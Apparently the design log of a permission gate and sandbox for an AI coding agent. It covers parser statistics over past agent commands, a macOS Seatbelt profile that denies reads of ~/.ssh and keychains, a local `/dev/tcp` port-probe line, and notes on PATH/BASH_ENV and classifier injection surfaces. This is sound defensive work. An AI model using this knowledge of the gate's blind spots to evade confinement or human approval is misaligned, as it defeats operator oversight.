`crates/tools/src/corpus_replay.rs` (library) and `examples/gate_corpus.rs` (its command
line) read a decision export and re-run today's `Baseline`, `shell::shape` and grant key
over every `bash` command in it. Nothing in the tree points at where the exports live; the
paths are arguments, because they hold the operator's own sessions. The sweep streams the
file (the largest export is 184 MiB), never reads a script off disk, and prints counts —
`LETIBOT_CORPUS_SHOW=n` adds request ids and readings, never command text. It also groups the
`parse_error` commands by cause ([`parse_cause`], which is 4i.7's table), because "the grammar
could not read this" is a bucket rather than a fact.

Two things about the export had to be got right before any number meant anything:

* **`then` is three spellings, not one.** Since 2026-10-02 the baseline summary carries
  *"the meaning was never resolved"*; before that date the verdict token was `not_run` and
  the summary had no reason to repeat it; and `boundary:normaliser` is the verdict-by of
  the one arm that means this. Read as the marker alone, **514 rows on lab2x1 looked like a
  regression** — read, then, and unread now — and every one of them was a pre-marker row.
* **The corpus does not record the workspace.** Intents do not depend on it; the region
  comparison does, so the report prints the two apart and names the assumption it ran
  under.

### 4i.2 Before and after, per host

161,097 `bash` decisions: lab2x1 134,428, mac 26,180, lubuntu1 489.

| | lab2x1 | mac | lubuntu1 | total |
|---|---|---|---|---|
| unread at G3's tip | 14,285 | 3,210 | 60 | 17,555 |
| unread after G4 | 7,633 | 2,402 | 30 | 10,065 |
| unread now | **7,533** | **2,353** | **30** | **9,916** |
| — as a share | 10.6% → 5.7% → **5.6%** | 12.3% → 9.2% → **9.0%** | 12.3% → 6.1% → **6.1%** | 10.9% → 6.2% → **6.2%** |
| commands that became readable | 11,091 → **11,191** | 1,719 → **1,768** | 35 | 12,845 → **12,994** |
| commands that stopped being readable | **0** | **0** | **0** | **0** |

So this change read **149 more commands** (100 / 49 / 0) and made none of them unread —
the LAST row is what it is measured by, and it is zero on every host in every run, as 4i.3's
`Brace` note says about the first cut that got it wrong.

By construct, commands it appears in / commands it is the only reason for, **G3's tip →
after G4 → now**:

| construct | lab2x1 | mac |
|---|---|---|
| `parameter_expansion` | 11,870 / 8,691 → 3,999 / 1,827 → 3,999 / 1,831 | 2,792 / 2,359 → 1,880 / 1,526 → 1,879 / 1,551 |
| `command_substitution_value` | 4,793 / 1,910 → 4,998 / 2,667 → 4,985 / 2,725 | 738 / 334 → 758 / 422 → 755 / 425 |
| `parse_error` | 541 / 188 → 577 / 294 → **425 / 235** | 64 / 26 → 64 / 26 → **34 / 19** |
| `arithmetic_expansion` | 440 / 34 → 486 / 136 → 486 / 139 | 24 / 3 → 26 / 5 → 27 / 5 |
| `process_substitution_path` | 254 / 151 → 254 / 191 → 254 / 197 | 17 / 11 → 17 / 14 → 17 / 15 |
| `brace_expansion` | 36 / 31 → 36 / 32 → **0 / 0** | 38 / 22 → 42 / 29 → **0 / 0** |
| `ansi_c_escapes` | 24 / 9 → 24 / 11 → **0 / 0** | 16 / 13 → 16 / 13 → **0 / 0** |
| `compound_argument` (new) | — → — → 27 / 7 | — → — → 2 / 2 |
| `expanded_heredoc` | 5 / 1 → 5 / 1 → 5 / 1 | — |

lubuntu1 has no row in this table: its 489 commands never had a brace, an ANSI-C string or a
parse error, and its 18 + 15 + 1 of the three that are left are unchanged.

**Three constructs moved in a direction that is not a reading getting worse, and each for its
own reason.** `parse_error` fell by 152 because a quarter of it was never the grammar (4i.7).
`command_substitution_value` fell by 13 on lab2x1 because of `$(pwd)` — and its `alone` column
ROSE by 58, which is the same fact seen from the other side: a command that was unread for a
parse error and a `$(date)` is now unread for the `$(date)` alone, so *"`command_substitution_
value:date`, alone"* goes 92 → 156. A count that falls because a construct was thrown away is
the number this section exists to avoid; a count that rises because the thing underneath it
became visible is the number it is for.

The workspace assumption: `--home /home/dead --workspace /home/dead/Projects/letibot`. The
region-set comparison depends on it, so 4i.5's region row is measured under it and moved from
1,512 to 1,212 when it changed — this change moved it by **0**.

### 4i.3 What was fixed, and why each is safe

**The shell's own numbers resolve — a number is not a place.** `$?` was the largest single
reason a command was unread: 6,019 commands, 4,827 of them for that reason alone, and one
idiom — a build or a test, then `echo "exit=$?"` to say how it went. The value is not in the
text and never will be, but its *reach* is: a status is `0`–`255`, `$#` is a count, `$$` and
`$!` are pids, `$RANDOM` and `$LINENO` are small integers, and a number names no directory.
The resolver writes the number `0` back (`intent/parameters.rs`, `NUMERIC`), and the note on
the audit row says why. This is the ruling of 2026-10-02 (*"`$?` inside `echo` widens nothing
`echo` can act on"*) applied where it belongs — the parser had been outranking the reading.
What it does NOT cover: `$@`, `$*`, `$1`, `$0`, `$-` and every name nobody assigned. Those
can be paths.

**A `for` over a list the command spells is unrolled** (`crates/code/src/shell.rs`). The loop
variable was the second-largest bucket — `$f` alone in 1,615 commands, 759 of them unread for
that alone — and the value on each pass is a word written three lines above. The body is
walked once per value with the variable bound, so the stages, regions, intents and shape are
the ones that will run. Not unrolled: a glob list, an expansion list, a quoted value that
splits into several words, and more than 32 values. Certainty stays *conditional*: a loop
body is still a loop body.

**A transform of a value is not the value** (`intent/parameters.rs`, `plain`). The grammar
reports the same `variable_name` for `${X}`, `${#X}` (a length), `${X%…}` (a suffix stripped),
`${X/a/b}` (a replacement), `${X:0:3}` (a slice) and `${!X}` (the value of the variable X
*names*). G3's resolver keyed on the name, so all six were read as `$X` — a claim about a
command nobody wrote. The check is now lexical, against the operator's own text.

**And the two defects the unrolling exposed**, both in the resolver and both fail-closed by
construction: one span is spliced once (a loop body is walked once per pass with the same
offsets, so `$?` in a body was reported once per pass against one place in the text), and a
substitution that would make a command *less* parseable than it was is abandoned whole — the
command keeps its constructs and stays unread.

**Brace expansion, ANSI-C quoting and `$(pwd)`** — the three 4i.6 called *decidable and
next*. Each is a reading rather than a loosening, and each keeps its own refusals.

* **A brace expansion is the words bash makes of it.** `{a,b}` and `{1..3}` are decided by
the text, and the words are expanded in bash's own order — leftmost outermost, rightmost
fastest (`x{1,2}{3,4}` is `x13 x14 x23 x24`) — with bash's own corners, each of them measured
on this box: an empty alternative makes no word (`echo {a,,b}` is two arguments), a nested
pair expands inside its alternative (`pre{a,{b,c}}post` is three words), `{{a,b}}` is `{a}`
and `{b}`, and `{-01..3}` pads to the sign (`-01 000 001 002 003`). Bounded at 32 words like
the `for` pass count — a thousand arguments is a script, not a reading — and past the bound
the word is **unread**, which is a change of mind from the first cut: it called `{1..100}` a
literal, and a literal here claims the program receives braces it does not. Still unread: an
alternative holding an expansion (`{$a,$b}`), one holding whitespace (`{a b,c}` — field
splitting makes more words than the braces did), a quoted alternative, and `{,}` (whose
argument vanishes). 36/31 → **0** on lab2x1 and 38/22 → **0** on the mac.
* **`$'…'` is decoded into the bytes the program receives.** `\n`, `\t`, `\xHH`, `\NNN`,
`\uHHHH`, `\UHHHHHHHH` and `\cX`, each arm taken from `od -tx1` of what bash 5.2 delivered
rather than from the manual — which is how the odd ones were got right: `\x` with no digit
keeps its backslash, `\x4` is `0x04` (one digit is a number), `\1011` is `A1` (three octal
digits at most), and `\c?` is DEL. An escape whose bytes are not a string this can carry (a
lone `\xff`, a NUL, a code point past `U+10FFFF`) stays unread. 24/11 → **0** on lab2x1 and
16/13 → **0** on the mac.
* **`$(pwd)` is `$PWD`.** The one substitution whose value is in the text, and the idiom
agents write (`cd "$(pwd)/…"`). Only that spelling: `$(pwd -P)`, `$(cd x && pwd)` and
`$(dirname $(pwd))` stay unread, and the inner command is still listed as its own stage.
Small — `command_substitution_value` 4,998 → 4,985 on lab2x1 — and 4i.6 said so before it was
built.

**And four shapes the census found were ours, not the grammar's.** The first two were
reported as *parse errors* about trees with no error in them, and together they were a
quarter of that class (4i.7):

* **A `$` that ends a word.** This grammar wraps `$?`, `$#` and `$$` in a `simple_expansion`
  when something follows them, but a `$` in the LAST position of a word comes back as the
  bare token — `echo x$$`, `cargo nextest -E run=^$` — and the resolver had no arm for it. A
  lone `$` is a literal dollar; `$$` is a pid and goes to the resolver as one of the shell's
  numbers. 133 commands on lab2x1.
* **A bare `variable_name` in an argument position.** `export SKIP_SLT` and `declare -x FOO`
  put the NAME where the resolver expected a value. 24 commands, every one of them an
  `export NAME` in a gate script.
* **A whole command in an argument position** (`time ( … )`, `! ( … )`): the grammar hangs
  the compound off the `command` node, and reading it as one opaque argument meant its
  commands were **never walked** — `time (cargo test …)` produced no stage for `cargo` and no
  redirect for its log. It is walked now and named `compound_argument` (27 on lab2x1, 2 on
  the mac); the command stays unread, because how a compound's value relates to the stage's
  argv is not stateable.
* **A brace inside quotes.** A `gh api graphql query='{repository(owner:"x",…)}'` is one
  concatenation of `query=` and a quoted string, and the brace check ran on the MERGED text —
  where its GraphQL braces looked like an expansion. 28 commands on the mac were refused for
  that, every one a query bash passes through untouched; the check now runs on the text with
  every quoted character blanked.

### 4i.4 What is still unread, and why it stays that way

* **`$PATH` — the largest thing left, and deliberately not done** (527 commands on lab2x1,
  1,347 on the mac, 1,157 of those for that reason alone). The value is not in the text, and
  unlike `$?` its reach is a *list of directories a later program is found in*: resolving
  `export PATH=…:$PATH` would let a shape or a session grant settle a command whose later
  stages may run a different binary than the one the table names. That is a rule about what
  runs unasked, which is the operator's to change — see 4i.6.
* **`$(…)`** (4,793 → 4,998 → 4,985 on lab2x1; 738 → 758 → 755 on the mac). The command
  inside is read and listed; the bytes it will produce are not in the text. `$(pwd)` is the
  one exception, and it is done (4i.3) — it was always exactly `$PWD`, which already
  resolves. 4i.6 was right that it is small: 13 commands on lab2x1.
* **Variables a *previous* command assigned** (`$p`, `$d`, `$pr`, `$CARGO_TARGET_DIR`, …,
  ~500 commands). These need a session-scoped environment, which is a design decision rather
  than a parser gap — see 4i.6.
* **`parse_error`** (425 on lab2x1, 34 on the mac): the grammar's own limits, by cause — a
  read-write redirect `<>` (207), a here-document operator followed by another operator on
  its line (122), and 96 that are mostly text bash itself refuses. **4i.7 is the census**, and
  the two upstream reproductions are there too.
* **`process_substitution_path`** — the shell invents `/dev/fd/N` at runtime; the inner
  command is already read and listed.
* **`arithmetic_expansion`** (486 on lab2x1), **`compound_argument`** (27 on lab2x1, 2 on the
  mac — a `time ( … )` whose commands ARE now walked, and whose value is not stateable), and
  **`expanded_heredoc`** (5). Arithmetic reads variables; the other two are named rather than
guessed.
* **Nothing is left in this list that the text decides.** `brace_expansion` and
  `ansi_c_escapes` were the last two, and both are at **0** on every host. What remains is a
  value nobody wrote down (`$PATH`, a previous command's variable, `$(…)`'s output), a
  construct the grammar cannot take (`<>`, a heredoc's second redirect), or a command that is
  not a command at all.

### 4i.5 What this did for a person, and for the oracle

| | lab2x1 at G4 | lab2x1 now | mac at G4 | mac now |
|---|---|---|---|---|
| human answers | 542 | 542 | 251 | 251 |
| …a standing approval would now settle | 192 | **202** | 78 | **81** |
| oracle decisions whose command was never read | 215 | 215 | 0 | 0 |
| …readable now | 151 | **151** | — | — |
| oracle rows whose intent set differs from the recorded brief | 136 | 136 | 0 | 0 |
| …whose region set differs | 1,212 | 1,212 | 0 | 0 |

**Ten more past approvals would settle a command now** (and three on the mac), which is this
package's whole point from a person's side: an unresolved action can never be covered by a
grant taken over its neighbours, so every command 4i.3 taught the parser to read makes the
answers already given reach further. The upper bound is `any` — grant, shape or the point
combined — 192 → **202** on lab2x1 and 78 → **81** on the mac.

**And this change moved no oracle reading, which is worth stating rather than leaving as a
zero.** 215 decisions were taken on a command nobody could read and 151 of them are readable
now — the same 151 before this package as after, because not one of the 149 commands it read
had a model in the loop. Rows differ 136 intents and 1,212 regions both before and after.

**The region count is drift, not a fault, and the number is not a claim about this change.**
The `baseline` column is what the oracle was shown *when the decision was taken*, by whatever
build was running then; the sweep compares it with today's reading, so the count carries
every parser change since each row was written, plus the workspace assumption above. G4's
number was 1,512 under a different `--workspace` and is 1,212 under this one, measured with
G4's own code (4i.2 says which).

### 4i.6 Recommendations, which are the operator's to take

1. **`$PATH` needs a rule before it needs a reading.** Resolving `export PATH=…:$PATH` is
   honest, and it would be safe only together with the second half: extend G3's
   *no durable rule over a segment that sets the shell's state*
   (`permission::sets_state_for_later`) to **session grants and approved shapes**, so a
   command that mutates `PATH` can never be settled by a grant taken over its neighbours.
   Until both land, leaving it unread is the fail-closed choice.
2. **A session-scoped variable environment.** ~500 commands read a variable a *previous*
   command assigned. The gate could remember the `NAME=value` statements it has itself read
   in a session, first assignment wins, cleared by `unset` — never carried across a session
   boundary, never read from the environment. That turns `cd $d && …` into a readable
   command; the cost is that a value can be changed by something the transcript did not see,
   so it must be recorded on the card as a value the session's own gate read.
3. ~~**Brace expansion and ANSI-C quoting** are decidable from the text and would be the next
   two parser changes.~~ **Done** — both are at 0 on every host (4i.3), and nothing that the
   text decides is left in the unread list (4i.4). What is left is a value nobody wrote down
   or a construct the grammar cannot take.
4. **The one place a decision moves is `reads_only`.** `echo "exit=$?"` now places its
   argument as `Region::None` instead of `Region::Unbounded`, so a command whose only intent
   is to print becomes a read and is admitted by the point (R21). That is the ruling of
   2026-10-02 finally taking effect, and it is still a change to what runs unasked: the
   count is in 4i.5, and the tier table and the oracle's prompt are untouched by this work.
5. **The three grammar reproductions in 4i.7 are worth filing upstream**, and they are not
   filed: `3<>file`, a here-document followed by a second redirect and a pipe, and `%(…)` in
   a word. Two of them retire 78% of what lab2x1 still cannot read, and none of the three is
   a decision anyone here can make.

### 4i.7 The parse errors, by cause — three are the grammar's, and the rest were ours

A `parse_error` is the one construct whose count alone says nothing: it is the resolver's
catch-all for *the grammar could not read this*, and after 4i.3 it was the third-largest
reason a command was unread while nobody had ever asked **what was in it**. So it is a
counted thing now — `corpus_replay::parse_cause`, printed by the sweep under the construct
table — and this section is that table, with the verdict on each class.

The first thing the census says is that **a quarter of the class was not the grammar at
all**. `partial == false` means the tree has no `ERROR` node and no `MISSING` one: the
grammar read every byte, and the command was called a parse error by the resolver's own
fall-through for a node kind it does not name. That is this crate's bug, in two spellings,
both fixed in 4i.3 — a `$` that ends a word (`x$$`, `-E run=^$`, 133 commands on lab2x1) and
a bare `variable_name` in an argument position (`export SKIP_SLT`, 24 more). Between them
**152 commands left this class**: 577 → 425 on lab2x1, 64 → 34 on the mac. (The two
spellings count 157 between them and the class fell by 152 because a command can carry two
parse errors and counts once.)

| cause | lab2x1 | mac | lubuntu1 | whose |
|---|---|---|---|---|
| a read-write redirect `<>` | 207 | 8 | 0 | the grammar |
| a here-document followed by another operator on its line | 122 | 4 | 0 | the grammar |
| the text is not a command this grammar reads | 96 | 22 | 0 | see below |
| a token the resolver does not name | **0** | **0** | **0** | ours — fixed |
| **total** | **425** | **34** | **0** | |

One class left this table without being fixed, and it is worth naming: a whole command in an
argument position (`time ( … )`, `! ( … )`) was ALSO counted here, and it is not a parse
error either — the tree is whole, the compound is hanging off the `command` node, and its
commands were never walked at all. It has its own construct now (`compound_argument`, 27 on
lab2x1 and 2 on the mac), and 4i.3 says what it cost.

#### The grammar's three, each reproduced minimally and **not filed**

```sh
# 1. The read-write redirect. This grammar's `file_redirect` has < > >> <& >& &> &>> and no
#    <>, so the operator recovers as an ERROR on one of the two characters and the command
#    is unread. Measured: the ERROR node is sometimes the `>` and sometimes the `<`.
exec 3<>/dev/tcp/127.0.0.1/5432

# 2. A here-document operator followed by ANOTHER redirect and then a pipe. `cat <<'EOF' |
#    tail` parses (the pipeline is nested inside `heredoc_redirect`); `cat <<'EOF' 2>&1 |
#    tail` does not — the file_redirect's pipe lands as an ERROR.
cat <<'EOF' 2>&1 | tail -3
x
EOF

# 3. `%(…)` in a word: a MISSING `;` is inserted at the end of the command.
git for-each-ref --format=%(refname)
```

Each is one node away from a class of commands rather than one command: `3<>/dev/tcp` is how
this operator probes whether a port is open (207 of 425 on lab2x1), and `<<'SQL' 2>&1 | head`
is how they run a query and look at its head (122). A fix upstream would retire 78% of what
is left on lab2x1, and it is a grammar change rather than a reading: the operator is real,
bash accepts all three, and recovery hides it behind a plausible-looking tree.

#### The third row, which is neither the grammar's fault nor stateable as one

96 on lab2x1 and 22 on the mac, and `bash -n` splits them: **63 of the 96 and 11 of the 22
are text bash itself refuses** — a truncated command (an unbalanced quote), Lisp source
inside a single-quoted argument, a heredoc terminator that never comes. For those the gate
is right and the count is a fact about the corpus, not about the parser.

The rest bash accepts, and inspection found two more shapes: `%(…)` in a word (2), and a
pair of backquotes inside an **unquoted** here-document body (the body is prose the shell
would expand, so the grammar parses it as a command substitution and the prose is not one).
Neither is worth a parser change: the first needs a grammar fix (row above), the second is a
command whose here-document would be mangled at RUN time as well.

#### What this census does not do

It does not run a shell: `bash -n` was run **once, by hand**, over every command in the
class to settle the third row, and the instrument itself only reads the tree. That is a
deliberate limit of `gate_corpus` — a sweep that spawned a process per corpus row would be
an instrument whose measurement is about this box.

## 4j. The Mac gets a measured boundary: Seatbelt

**Built 2026-10-27 (TODO R98 half 2), `crates/tools/src/exec/seatbelt.rs`.** D16 admits a command
without a card *inside a measured boundary*, and until this section existed macOS had no such
thing: a Mac session was either a firecode VM (slow, and a Linux guest) or an unconfined
whole-host shell, in which case every `cargo test` had to be asked about — the operator's own
complaint, *"will make me run things in allow-all everytime"*.

macOS has no namespaces, no cgroups and no `unshare`. What it has is **Seatbelt**:
`sandbox-exec -f <profile>`, a mandatory-access policy the kernel evaluates on every file, mach,
network and process operation the process and everything it execs performs. Deprecated, present,
and what Chrome ships to three hundred million people. `crate::exec::confine::probe` now answers
with a namespace boundary on Linux and a policy boundary here, and both are the same contract: a
[`ViewSpec`](crate::exec::confine::ViewSpec) in, a measured `Boundary` out.

### One policy, two renderings

The view decides **what is inside** — the project read-write at its own path, the system roots
read-only, the toolchain read-only (`.cargo`, `.rustup`, `.local/bin`, the mise trees,
`Projects/llama.cpp`, `models`, `.gitconfig`, out of the *operator's* home because the session's
home is fresh and holds no toolchain), `$HOME` and `/tmp` the session's own directories, egress a
decision. `confine::pieces_of` renders it as a bubblewrap argv; `seatbelt::render_profile` renders
the same view as SBPL text. Neither reads the other, and a field added to the view breaks both or
neither — which is what keeps the two platforms from drifting apart.

```
(deny default)
(allow process*) (allow sysctl-read) (allow signal (target self))
(allow mach-lookup (global-name "com.apple.system.logger") …)   ; six, measured
(allow file-read* (literal "/") (subpath "/usr") …)             ; system + toolchain + view
(allow file-write* (subpath <checkout>) (subpath <session home>) …)
(deny network*)                                                  ; or (allow network*) — the decision
(deny file-read* file-write* (subpath "~/.ssh") …)              ; AFTER every allow, on purpose
```

Three details in that text are measurements rather than taste:

* **`(literal "/")` is load-bearing.** A profile that allows `file-read*` on `/usr` and the rest
  but not on `/` itself makes *every* process abort with `SIGABRT` before `main` — something in
  libsystem reads the root directory at start-up and the sandbox's check-in dies of the refusal.
  Found by bisecting a profile that aborted `true`.
* **The deny block is emitted last**, because SBPL is last-match-wins. That is the one place this
  weaker mechanism is *stricter* than the mount namespace: a grant of the whole home directory
  widens the view (the operator's `--grant-ro ~`), and on Linux a bind mount cannot exclude a path
  inside itself — here the deny rule still wins, so a widened view still cannot read `~/.ssh`,
  the keychains, the shell profiles or letibot's own store. The probe measures exactly that: a
  canary written inside a directory the profile allows read-write, denied by name.
* **`(subpath "<TMPDIR>/xcrun_db")`** — the only thing in the per-user temp directory the profile
  reaches. `git`, `make` and `/usr/bin/python3` are `xcrun` shims that `dlopen` a cache into
  `confstr(_CS_DARWIN_USER_TEMP_DIR)`, which is *not* `TMPDIR` and so cannot be redirected into
  the session's own directory; without the two lines every one of those commands prints
  `xcrun: error: couldn't create cache file`.

### What the probe measures, and what it refuses on

`Seatbelt::probe` runs one shell script **inside the profile** and reads `probe <name> <outcome>`
lines back — the same rule `Bwrap::probe` follows (*guard the fact, not the proxy*):

| subject | must be | the refusal if not |
|---|---|---|
| the canary, inside a writable part of the view | unreadable | the deny list does not win → **nothing runs** |
| a write to a path outside the checkout | `EPERM` | a write outside succeeded → nothing runs |
| a write inside the checkout | succeeds | the boundary forbids the session's own work → nothing runs |
| `sh -c true` | runs | fork/exec failed inside → nothing runs |
| a nested `sh -c` reading the canary | unreadable | a child strips the boundary → nothing runs |
| `kill -0 <this process's pid>`, from inside | `EPERM` | a signal reaches out of the boundary — recorded as `Absent`, not refused |
| a connect to `127.0.0.1:1` and to `192.0.2.1:80` | `EPERM` **when egress is denied** | an egress decision that did not take → nothing runs |

Nothing is sent anywhere: the loopback subject is a port nothing listens on and the external one
is TEST-NET-1 (RFC 5737, reserved for documentation and routed nowhere), and `nc -z` closes as
soon as the answer arrives.

### What macOS cannot give, and how the description says it

The boundary's property table (`confine::Prop`) is how a mechanism without namespaces describes
itself. Three properties are **required**; the fourth is reported as `ABSENT — this OS cannot give
it` and is printed in full rather than omitted:

| property | measured | how it differs from Linux |
|---|---|---|
| `file-view` | **held** — the canary is unreadable over a writable home, a write outside fails, a write inside succeeds | **denied, not absent**: the file is there and `open` answers `EPERM`, where a mount namespace makes it not-there. `absence_notes` is written for each: `Operation not permitted` is the boundary on a Mac, and a note that only knew `ENOENT` would say nothing at all |
| `process-isolation` | **held** — `kill -0` on a process outside is `EPERM`; `ps` is refused; a child *inside* is still killable, so job control works | no PID namespace |
| `nested` | **held** — a child `sh -c` inherits the profile and is denied the same path | the policy is applied at `exec` and inherited, so there is nothing to `unshare` out of |
| `process-absence` | **ABSENT** — macOS has no PID namespace | a process outside is unreachable, not invisible; a lookup by pid still finds it, and `/proc` does not exist |

And two seals, one of them `NOT APPLICABLE on this platform`: `no-new-privs` has no macOS
counterpart (`PR_SET_NO_NEW_PRIVS` is a Linux prctl; what macOS gives instead is that the kernel
applies the policy at `exec`, so a setuid program inside inherits it — measured, and stated as
the substitute rather than as the property). `no cgroup`: the lifetime half is
`exec::scope::ProcessGroups`, which reaps by process group and says in its own docs that a group
can be left with `setsid` and that a group id is a reused pid.

**Does that count as measured for D16?** My reading, written here because it is the argument the
decision now rests on: **yes for the half the operator's rule is about.** D16's sentence is *"the
agent can write any code in the test file and then do the test … the only real defense is cgroups
and namespaces"* — the consequence being guarded against is what a program the agent wrote can
**read** and **send**, because those are what outlive the session. The file and network halves are
measured holding, per process and inherited by every child. What macOS does not give is process
*absence*, and a command that signals the daemon is a denial of service on this box rather than a
disclosure of the operator's data — it is printed as `ABSENT` on the boundary's own description,
and the reaping half is the process-group tree that macOS already had. A reader who disagrees has
the sentence in front of them, which is the point of the table.

### What it costs, measured

MEASURED 2026-10-27 on this Mac (arm64, macOS 26.7.1), one profile of **87 lines, 11 rules, 61
path filters**:

| | plain | inside the boundary | added |
|---|---|---|---|
| 100 × `/usr/bin/true` | 0.128 s (1.28 ms/call) | 0.641 s (6.41 ms/call) | **+5.1 ms/call** |
| `cargo --version`, 10 calls | 14.0 ms | 18.6 ms | +4.5 ms |
| `git --version`, 10 calls | 7.7 ms | 12.3 ms | +4.6 ms |
| `cargo check --offline` on a crate with one registry dependency | works | works (0.78 s warm) | — |

The cost is a **fixed ~5 ms per exec** — `sandbox-exec` applying the policy in the child, plus the
profile being read — and it does not grow with what the command does. A session's `cargo test`
pays it once. The other cost is stated in the module: the toolchain is read-only, so a build that
needs a **new** dependency cannot fetch it into the registry from inside the boundary and fails
saying so.

### What is wired

* `HostBackend::confined` / `confined_granting` ask `confine::probe`, so on macOS a `coder` or
  `runner` session gets the policy boundary and `backend_confined` is true — which is what makes
  **`allow-all` available on a Mac at all** (D13's `Prereq::Confinement`). Sessions that
  already run unconfined (`leticode`) are untouched.
* Every widening re-probes through the same dispatch: `with_session_tmp` (the session's `/tmp`)
  and `grant_into_view_impl` (`--grant-ro`, the landing tree, a path the operator admitted) each
  build a new view, a new profile and a new measurement, so what is described is what runs.
* `bash`, background jobs and the persistent shell all go through `Confinement::wrap`, which for
  this mechanism is `sandbox-exec -f <profile> /bin/sh -c 'export HOME=… TMPDIR=…; exec "$@"'`.
  The shim exists because a profile cannot set an environment variable and `wrap` returns an
  argv: `HOME` must be the session's own directory (or `cargo`, `git` and `ssh` write into the
  operator's, where the deny list refuses them), `TMPDIR` the session's own, and
  `CARGO_HOME`/`RUSTUP_HOME` the operator's **read-only** toolchain, since the session's home has
  none.
* If `sandbox-exec` is missing or the probe refuses, the daemon **seats an unconfined whole-host
  session, says so on the session's log as `boundary_absent`, and prints the refusal's own words**
  — the old behaviour, told out loud. On Linux the same failure is still a refusal, because
  `bwrap` and a delegated cgroup are things a host can be given.

### What is still open

* **The profile is written per probe and never removed** — `$TMPDIR/letibot-seatbelt-<pid>/profile-<n>.sb`,
  one per session plus one per widening. It is outside every checkout on purpose (a policy the
  command can edit is not a policy) and it is debris a per-user temp directory already holds.
* **`mach-lookup` is a six-name list, not a filter over everything.** A program needing a service
  not on it fails with the service's name and the fix is one line in `seatbelt::MACH_SERVICES`;
  a session that meets one has found a gap this section does not know about.
* **`sandbox-exec` is deprecated.** It has been deprecated for a decade and is still present in
  macOS 26; the day it goes, `probe` refuses by name and every session falls back to the
  `boundary_absent` sentence above. A replacement would be an Endpoint Security client or a
  firecode VM, and neither is this change.

## 5. Open

Layers 2 and 3's seam were **built** on 2026-09-10 — `crates/code/src/shell.rs`,
`crates/tools/src/intent.rs`, `crates/tools/src/authorise.rs`, and the gate in
`crates/tools/src/adjudicate.rs`. §4's four outcomes, the always-ask list, the flow rule
and the earned scope are all code now. What follows is what building them **settled**,
and what it did not, recorded here so the next reader is not told something the code has
since disproved.

### Settled by building it

- **~~Whether the classifier sees the raw conversation or a summary of the
  authorisation.~~** **Neither.** It sees `authorise::ModelBrief`, which has no field
  holding the command as written: the *post-expansion* words, the scoped intents, the
  regions, and the operator's utterances with their distance. The injection surface the
  question worried about is real, and it is why layer B may only ever widen. A surveyed
  harness gets the layering right and still shows its classifier the raw string, which
  launders the vulnerability through the model rather than solving it — and a test here
  asserts the raw text never reaches the oracle, which caught a leak through the request
  summary while it was being written.

- **~~What counts as "the same task direction".~~** `authorise::TaskDirection` =
  `(tool, intent set, effect scope, region set)`. Not the arguments — they change on
  every re-spelling, so the counter would never reach three and the breaker would be
  measuring typing. Not the tool alone — unrelated denials would trip it. Where the
  definition is wrong is written beside it: it over-merges, and every error mode pushes
  toward asking a human, which is the direction a breaker should fail in.

- **~~Whether `NEVER_WRITE` survives at all.~~** **Yes, demoted.** Still the first
  precheck, still overridable by nobody, and it no longer decides anything interesting:
  the flow rule does, and needs no allowlist of programs. T25/D20's false positive is
  gone by construction — a `web_search` query is not a path, and `intent::Region` places
  paths rather than matching spellings.

- **~~A hard list of destructive commands.~~** **Deleted, and `ALWAYS_ASK` is not it.**
  §4's distinction is now load-bearing in code: a block list says *never* and gets widened
  by exception until it dies; an always-ask list says *the operator decides this one*.
  Three separate mechanisms keep the classifier from shrinking it — the tier mints no
  `Adjudicable`, the gate refuses to record a class grant for one, and the prompt does not
  offer a standing-grant option at all.

### What layer 1 must guarantee for layer 2 to mean anything

**A resolved parse is not a resolved meaning.** A grammar reads text; a shell resolves a
bare command name through aliases, functions and `PATH`, none of which are in the text —
which is how the survey's best parser is defeated. So `intent::ShellTrust` defaults to
`Unknown`, under which a **bare** name is unresolved and the command is `not_run`; an
absolute path is not shadowable and is unaffected.

The gap is small and specific, because `exec/host.rs` already spawns `/bin/sh -c`:
non-interactive and non-login, so no rc file is read, and `/bin/sh` is `dash` here, which
reads `$ENV` only when interactive. What remains before
`Surroundings::with_pinned_shell` can honestly be called:

1. `env_clear()` before the explicit `env` pairs, so `PATH` is pinned rather than
   inherited.
2. Unset `BASH_ENV`, `ENV`, `SHELLOPTS`, `BASHOPTS`. `BASH_ENV` **is** sourced by bash for
   non-interactive shells, so a distribution where `/bin/sh` is bash has a real injection
   point this box does not.

Stated as a requirement rather than assumed, because a requirement crosses a merge where
an assumption does not.

### Still open

- **How a denial is presented without becoming a nag.** §4b requires every denial to
  surface; a session that denies often must not turn into a wall of notices. The
  consecutive-denial breaker is part of the answer — it stops the *second* attempt
  becoming a third notice — and probably not all of it. `DenialNotice` carries
  `BreakerState`, so a head has what it needs to collapse repeats, and nothing does yet.

- **Where the transcript edge is enforced.** Narrower than it was.
  `shell::Stage::stdout_surfaces` is the structural half, and §3's rule is decided on it.
  What is still missing is the single choke point every tool result passes through: today
  each tool builds its own body, and `Baseline::of_paths` covers the path-shaped tools by
  *reproducing* the rule rather than by sharing an edge. Two implementations of one
  invariant is how invariants stop agreeing.

- **What a fine-tune needs that the row does not yet carry.** `AdjudicationRow` keeps the
  action, the trail as shown, the model's verdict and the operator's override as separate
  values, which is the shape §4c asks for. It has no wall-clock timestamp
  (`letibot-transcript` does not stamp items, so `Utterance::seconds_ago` is `None` unless
  a session loop supplies it), no record of which *model build* answered, and no outcome
  after the fact — whether an admitted action turned out to be what the operator wanted is
  not captured anywhere, and that is the label a calibration would most want.

- **The model itself is not built here.** The seam takes an `AuthorisationOracle`; the
  fake is `ScriptedOracle`; what a real one needs is written into that trait — a
  `ModelBrief` and never a string, a `budget()` it is abandoned for overrunning, and a
  `scope()` earned by measurement rather than granted by assumption.

## 6. D16 and R98 — the boundary decides, and where there is none the test *is* the program

Written 2026-10-27, both rulings the operator's. This is what the gate does differently, and
it is deliberately the last section: everything above still describes the machinery, and what
changed is **how often it is reached**.

### The measurement that made the ruling

A package session on a remote host at `writes-allowed` asked **over a hundred times** across one
brief (RH3), and a session on the operator's own box was no better. Two things were wrong with
every one of those cards, and the operator said the second one plainly:

> *"the thing is - agent can write any code in the test file and then do the test. the only real
> defense is cgroups and namespaces. the rest is theater."*

A per-command ruling inside a confinement that letibot has **measured** protects nothing a
freshly written test could not do instead — and that test is a `write`, which `writes-allowed`
already admits. So the card was not buying a decision; it was buying a keystroke.

### What is admitted, and by what test

At `writes-allowed`, an `Access::Exec` call is admitted with **no card** when all four hold
(`AdjudicatedGate::admit`, the arm labelled D16):

1. **The backend's confinement is measured and holds.** `Boundary::encloses` —
   every required namespace entered (user, mount, pid), **both seals `Held`** rather than merely
   not-open, and the boundary's egress the empty network namespace. The seal clause is stricter
